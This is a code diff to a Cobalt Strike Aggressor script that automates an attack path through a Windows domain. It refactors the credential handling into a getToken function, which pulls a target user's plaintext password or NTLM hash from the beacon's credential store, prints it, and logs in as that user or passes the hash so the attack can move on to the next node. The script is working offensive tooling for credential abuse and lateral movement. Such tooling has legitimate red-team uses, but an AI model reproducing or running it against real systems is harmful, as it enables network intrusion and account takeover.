@@ -15,7 +15,7 @@ include(script_resource("utils.cna"));
 
 # Ordered array with attack path in format
 # @(@(%node, relationship), @(%node, relationship), @(%lastnode))
-global('@relationships @edges @nodes @final $waitFor $currentBid $nextLabel $True $False $attackActive $pos $listener $psexec $mimikatz $randomPuppy');
+global('@edges @nodes @final $waitFor $currentBid $nextLabel $True $False $attackActive $pos $listener $psexec $mimikatz $randomPuppy');
 
 sub parseNodes {
     local('$json');
@@ -243,7 +243,63 @@ sub parseGraph {
 
         $pos = 0;
 	}, $bids => $1));
+}
 
+sub getToken {
+    # We got the set of credentials we need in the cred store, we want to grab it out now.
+
+    $plaintext = $False;
+    $hashes = $False;
+    foreach $cred (credentials()){
+        println("Comparing " . $cred["user"] . " vs. " . $nextLabel);
+        if (($nextLabel eq uc($cred["user"])) && ($cred["password"] !ismatch "[0-9a-f]{32}")) {
+            # Current $Cred object 
+            $targetCreds = $cred;
+            $plaintext = $True;
+            break;
+        }
+    }
+    # Plaintext found? If not, let's go for a look at finding hashes.
+    if ($plaintext eq $False){
+        foreach $cred (credentials()){
+            if ($nextLabel eq uc($cred["user"])) {
+                # Current $Cred object 
+                $targetCreds = $cred;
+                $hashes = $True;
+                $plaintext = $False;
+                break;
+            }
+        }
+    }
+
+    if (($plaintext eq $True || $hashes eq $True) && (uc($targetCreds["user"]) eq $nextLabel)) {
+        # All good to go
+        # We have a plaintext or hash, so go ahead and get into context.
+        $domain = $targetCreds["realm"];
+        $user = $targetCreds["user"];
+        $password = $targetCreds["password"];
+
+        println("Domain: " . $domain);
+        println("User: " . $user);
+        println("Password: " . $password);
+
+        if ($plaintext eq $True){
+            println("Using PLAIN TEXT LOGIN");
+            bloginuser($currentBid, $domain, $user, $password);
+        }
+        else {
+            # Must be a password hash at this point
+            println("Using PASS THE HASH");
+            bpassthehash($currentBid, $domain, $user, $password);
+        }
+        #bpause($currentBid, 5000);
+
+        $pos = $pos + 1;
+        $mimikatz = $False;
+    }
+    else{
+        println("Credentials are not found in credential store for the target");
+    }
 }
 
 sub executeAttack {
@@ -281,9 +337,9 @@ sub executeAttack {
             }
         }
         else if ($waitFor ne "") {
-        # Error occured, let's reset waitFor
-        $waitFor = "";
-        println("Error: WaitFor override with wrong beacon");
+            # Error occured, let's reset waitFor
+            $waitFor = "";
+            println("Error: WaitFor override with wrong beacon");
         }
 
     }
@@ -307,62 +363,7 @@ sub executeAttack {
         }
 
         if ($waitFor eq $nextLabel) {
-            # We got the set of credentials we need in the cred store, we want to grab it out now.
-
-            $plaintext = $False;
-            $hashes = $False;
-            foreach $cred (credentials()){
-                println("Comparing " . $cred["user"] . " vs. " . $nextLabel);
-                if (($nextLabel eq uc($cred["user"])) && ($cred["password"] !ismatch "[0-9a-f]{32}")) {
-                    # Current $Cred object 
-                    $targetCreds = $cred;
-                    $plaintext = $True;
-                    break;
-                }
-            }
-            # Plaintext found? If not, let's go for a look at finding hashes.
-            if ($plaintext eq $False){
-                foreach $cred (credentials()){
-                    if ($nextLabel eq uc($cred["user"])) {
-                        # Current $Cred object 
-                        $targetCreds = $cred;
-                        $hashes = $True;
-                        $plaintext = $False;
-                        break;
-                    }
-                }
-            }
-
-            if (($plaintext eq $True || $hashes eq $True) && (uc($targetCreds["user"]) eq $nextLabel)) {
-                # All good to go
-
-                # We have a plaintext or hash, so go ahead and get into context.
-
-                $domain = $targetCreds["realm"];
-                $user = $targetCreds["user"];
-                $password = $targetCreds["password"];
-
-                println("Domain: " . $domain);
-                println("User: " . $user);
-                println("Password: " . $password);
-
-                if ($plaintext eq $True){
-                    println("Using PLAIN TEXT LOGIN");
-                    bloginuser($currentBid, $domain, $user, $password);
-                }
-                else {
-                    # Must be a password hash at this point
-                    println("Using PASS THE HASH");
-                    bpassthehash($currentBid, $domain, $user, $password);
-                }
-                #bpause($currentBid, 5000);
-
-                $pos = $pos + 1;
-                $mimikatz = $False;
-            }
-            else{
-                println("Credentials are not found in credential store for the target");
-            }
+            getToken();
         }
         else if ($waitFor ne "") {
             println("Error: WaitFor override with wrong credentials");
